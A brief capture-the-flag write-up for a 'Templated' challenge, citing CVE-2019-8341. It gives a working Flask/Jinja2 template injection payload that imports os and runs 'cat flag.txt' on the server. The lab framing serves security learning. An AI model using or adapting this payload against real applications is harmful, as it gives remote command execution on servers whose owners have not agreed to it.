## Templated challenge

### CVE-2019-8341

https://www.cvedetails.com/cve/CVE-2019-8341/

https://www.exploit-db.com/exploits/46386

___

![Screenshot from 2021-10-06 02-04-04](https://user-images.githubusercontent.com/86022395/136114734-4f7f8df5-c03b-495c-93fe-820b84b3e767.png)

Flask/Jinja2 Remote Code Execution exploit to cat flag.txt from the server.

payload
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`